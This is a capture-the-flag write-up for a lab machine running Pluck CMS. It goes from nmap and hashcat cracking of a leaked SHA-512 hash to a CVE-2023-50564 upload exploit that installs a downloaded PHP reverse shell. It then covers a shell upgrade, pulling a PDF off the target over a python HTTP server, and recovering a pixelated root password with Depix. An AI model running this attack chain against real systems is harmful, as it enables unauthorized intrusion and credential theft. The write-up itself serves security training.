# User flag

To start the machine, we run an `Nmap` scan to identify open ports, which reveal ports **22**, **80** and **3000**.  

![nmap](Images/nmap.png?1730060938573)

Upon accessing the website, a quick glance reveals an "admin" option we can interact with. Additionally, we notice the website uses a software called **Pluck**.

![admin-option](Images/admin-option.png?1730060618887)

We also decide to check the web page accessible on port 3000.

![](Images/greenhorn.png?1730401689597)

This page turns out to be a Git repository.

By reviewing the `login.php` file available in the repository, we see a reference to another file called `pass.php`. Additionally, this file indicates that passwords are stored using **SHA-512** encryption.

![](Images/login-php.png?1730149633385)

When inspecting the code in this file, we can retrieve the password for a user.

![](Images/pass.php.png?1730149200087)

We use **Hashcat** to decrypt the password, specifying the identified encryption method.

```bash
hashcat -m 1700 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

![](Images/pass.png?1730150347389)

Using the password `iloveyou1`, we log into the Pluck login portal previously noted.

In the administration page, we identify the specific version of Pluck being used.

![](Images/admin-page.png?1730061248528)

Searching online, we find an exploit associated with this Pluck version.

[CVE-2023-50564](https://github.com/Rai2en/CVE-2023-50564_Pluck-v4.7.18_PoC) `is a vulnerability that allows unauthorized file uploads in Pluck CMS version 4.7.18. This exploit leverages a flaw in the module installation function to upload a ZIP file containing a PHP shell, allowing remote command execution.`

To execute the exploit, follow this command sequence:

```bash
# Create virtual environment
python3 -m venv venv

# Activate virtual environment
source venv/bin/activate

# Install required packages
pip install requests requests_toolbelt

# Clone the repository
git clone https://github.com/Rai2en/CVE-2023-50564_Pluck-v4.7.18_PoC.git

# Navigate to exploit directory
cd CVE-2023-50564_Pluck-v4.7.18_PoC

# Modify exploit values
nano poc.py

# Download PHP reverse shell from pentestmonkey
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php

# Adjust values in the reverse shell script
nano shell

# Create a ZIP file with the payload
zip ./payload.zip shell.php

# Run the exploit
python poc.py

# Deactivate virtual environment
deactivate

```

The following modifications are needed in `poc.py`:

![](Images/poc-file.png?1730653063714)

After running the script with the required modifications, we gain access as the `www-data` user.

![](Images/www-data.png?1730653182616)

For easier interaction, it's recommended to upgrade the shell.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# we need to *restart* to apply the changes, so we do:  
CTRL+Z  
stty raw -echo; fg  
reset xterm
export TERM=xterm
export SHELL=bash
```

As we’ve seen before, there’s a user named `junior`, so we try accessing using the credentials we used for the web login, successfully obtaining the user flag.

![](Images/user-flag.png?1730653496775)

# Root flag

In `junior`'s directory, we find a file called **Using OpenVas.pdf**, which belongs to root. Given the PDF extension, we can't view it correctly on the target machine, so we transfer it to our local machine to open it without issues.

```bash
# target machine
sudo python3 -m http.server 8080

# local machine
wget greenhprn.htb:8080/'Using OpenVas.pdf'
```

Inside the PDF, we find a message from root addressed to junior with the following content:

![](Images/Using-openvas.png?1730655285766)

To determine root’s password, we need to de-pixelate the image embedded in the PDF.

First, we extract the image from the PDF.

```bash
pdfimages -png file.pdf output_image
```

Next, we use the **Depix** tool.

```bash
# Instalation
git clone https://github.com/spipm/Depix
cd Depix
```

```bash
python3 depix.py -p /path/to/your/input/image.png -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png -o /path/to/your/output.png
```

After running the command, the output file reveals the following password:

![](Images/root-pass.png?1730658558914)

  
`_sidefromsidetheothersidesidefromsidetheotherside_`

With this password, we can now switch to the root user and obtain the root flag.

![](Images/root-flag.png?1730658758392)
